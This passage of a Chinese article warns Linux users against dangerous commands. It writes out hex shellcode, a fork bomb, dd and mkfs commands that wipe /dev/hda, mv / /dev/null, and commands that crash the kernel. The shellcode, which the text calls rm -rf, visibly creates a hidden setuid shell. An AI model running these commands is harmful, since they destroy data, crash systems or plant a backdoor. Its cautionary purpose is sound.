class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x92</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd2</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x16</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">xf7</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c0f126051257-4\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x04</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x08</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0c</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x83</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc4</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x74</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x56</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6359ca54c0f126051257-5\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x73</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x08</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x53</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x59</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xb0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0b</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xcd</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x80</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x31</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c0f126051257-6\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x40</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xeb</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf9</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xe8</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xbd</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2f</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x62</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x69</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6359ca54c0f126051257-7\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x6e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2f</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x73</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x00</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x63</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x00</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c0f126051257-8\">“<span class=\"crayon-v\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">beyond</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4755</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca54c0f126051257-9\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">beyond</span><span class=\"crayon-sy\">;</span>”<span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<p>这是什么？这是 16 进制的 <strong>rm -rf</strong> 写法。在你不明确这段代码之前，请千万不要运行这条命令！</p>\n<h1 id=\"toc_2\">fork 炸弹</h1>\n<p>既然我们讨论的都是些奇怪的代码，不妨思考一下这一行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c1c081202242\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:(){ :|: &amp; };:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c1c081202242-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c1c081202242-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>对你来说，这可能看起来有些神秘，但是我看来，它就是那个臭名昭著的 <a href=\"https://linux.cn/article-5685-1.html\">Bash fork 炸弹</a>。它会反复启动新的 Bash shell，直到你的系统资源消耗殆尽、系统崩溃。</p>\n<p>不应该在最新的 Linux 系统上做这些操作。注意，我说的是<strong>不应该</strong>。我没有说<strong>不能</strong>。正确设置用户权限，Linux 系统能够阻止这些破坏性行为。通常用户仅限于分配使用机器可用内存。但是如果作为 root 用户的你运行了这行命令（或者它的变体 <a href=\"https://unix.stackexchange.com/questions/283496/why-do-these-bash-fork-bombs-work-differently-and-what-is-the-significance-of\">Bash fork 炸弹变体</a>），你仍然可以反复虐待服务器，直到系统重启了。</p>\n<h1 id=\"toc_3\">垃圾数据重写硬盘</h1>\n<p>有时候你想彻底清除硬盘的数据，你应该使用 <a href=\"https://dban.org/\">Darik’s Boot and Nuke （DBAN）</a> 工具去完成这项工作。</p>\n<p>但是如果仅仅想让你的存储器乱套，那很简单：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c21029854257\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n任意命令 &gt; /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c21029854257-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c21029854257-1\">任意命令<span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我说的“任意命令”，是指有输出的任意命令，比如:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c27463579330\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls -la &gt; /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c27463579330-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c27463579330-1\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">la</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>……将目录列表通过管道送到你的主存储设备。给我 root 权限和足够的时间，就能覆盖整个硬盘设备。这是让你开始盲目恐慌的一天的好办法，或者，可以把它变成 <a href=\"https://www.hpe.com/us/en/insights/articles/13-ways-to-tank-your-it-career-1707.html\">职业禁入方式</a>。</p>\n<h1 id=\"toc_4\">擦除硬盘！</h1>\n<p>另一个一直受欢迎的擦除硬盘的方式是执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c2b466350871\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndd if=/dev/zero of=/dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c2b466350871-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c2b466350871-1\"><span class=\"crayon-e\">dd </span><span class=\"crayon-st\">if</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">zero </span><span class=\"crayon-v\">of</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你可以用这条命令写入数据到你的硬盘设备。<strong>dd</strong> 命令可以从特殊文件中获取无尽个 <strong>0</strong> 字符，并且将它全部写入你的设备。</p>\n<p>可能现在听起来 <strong>/dev/zero</strong> 是个愚蠢的想法，但是它真的管用。比如说，你可以使用它来 <a href=\"https://unix.stackexchange.com/questions/44234/clear-unused-space-with-zeros-ext3-ext4\">用零清除未使用的分区空间</a>。它能使分区的镜像压缩到更小，以便于数据传输或是存档使用。</p>\n<p>在另一方面，它和 <strong>dd if=/dev/random of=/dev/hda</strong> 相近，除了能毁掉你的一天之外，不是一个好事。如果你运行了这个指令（千万不要），你的存储器会被随机数据覆盖。作为一个隐藏你要接管办公室咖啡机的秘密计划的半吊子方法，倒是不错，但是你可以使用 DBAN 工具去更好的完成你的任务。</p>\n<h1 id=\"toc_5\">/dev/null 的损失</h1>\n<p>也许因为数据珍贵，我们对备份的数据没有什么信心，确实很多“永远不要这样做！”的命令都会导致硬盘或其它存储仓库的数据被擦除。一个鲜明的实例：另一个毁灭你的存储设备的方式，运行 <strong>mv / /dev/null</strong> 或者 <strong>&gt;mv /dev/null</strong>。</p>\n<p>在前一种情况下，你作为 root 用户，把整个磁盘数据都送进这个如饥似渴的 <strong>/dev/null</strong>。在后者，你仅仅把家目录喂给这个空空如也的仓库。任何一种情况下，除非还原备份，你再也不会再看见你的数据了。</p>\n<p>见鬼，难道会计真的不需要最新的应收账款文件了吗？</p>\n<h1 id=\"toc_6\">格式化错了驱动器</h1>\n<p>有时候你需要使用这一条命令格式化驱动器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c30949900145\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkfs.ext3 /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c30949900145-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c30949900145-1\"><span class=\"crayon-v\">mkfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ext3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>……它会用 ext3 文件系统格式化主硬盘驱动器。别，请等一下！你正在格式化你的主驱动器！难道你不需要用它？</p>\n<p>当你要格式化驱动器的时候，请务必加倍确认你正在格式化的分区是真的需要格式化的那块而不是你正在使用的那块，无论它们是 SSD、闪存盘还是其他氧化铁磁盘。</p>\n<h1 id=\"toc_7\">内核崩溃</h1>\n<p>一些 Linux 命令不能让你的机器长时间停机。然而，一些命令却可以导致内核崩溃。这些错误通常是由硬件问题引起的，但你也可以自己搞崩。</p>\n<p>当你遭遇内核崩溃，重新启动系统你才可以恢复工作。在一些情况下，这只是有点小烦；在另一些情况下，这是一个大问题，比如说，高负荷运作下的生产环境。下面有一个案例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c33792906944\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndd if=/dev/random of=/dev/port\r\necho 1 &gt; /proc/sys/kernel/panic\r\ncat /dev/port\r\ncat /dev/zero &gt; /dev/mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c33792906944-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c33792906944-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c33792906944-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c33792906944-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c33792906944-1\"><span class=\"crayon-e\">dd </span><span class=\"crayon-st\">if</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">random </span><span class=\"crayon-v\">of</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">port</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c33792906944-2\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">kernel</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">panic</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca54c33792906944-3\"><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">port</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c33792906944-4\"><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">zero</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>这些都会导致内核崩溃。</p>\n<p>绝不要运行你并不了解它功能的命令，它们都在提醒我…</p>\n<h1 id=\"toc_8\">提防未知脚本</h1>\n<p>年轻或是懒惰的系统管理员喜欢复制别人的脚本。何必重新重复造轮子？所以，他们找到了一个很酷的脚本，承诺会自动检查所有备份。他们就这样运行它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 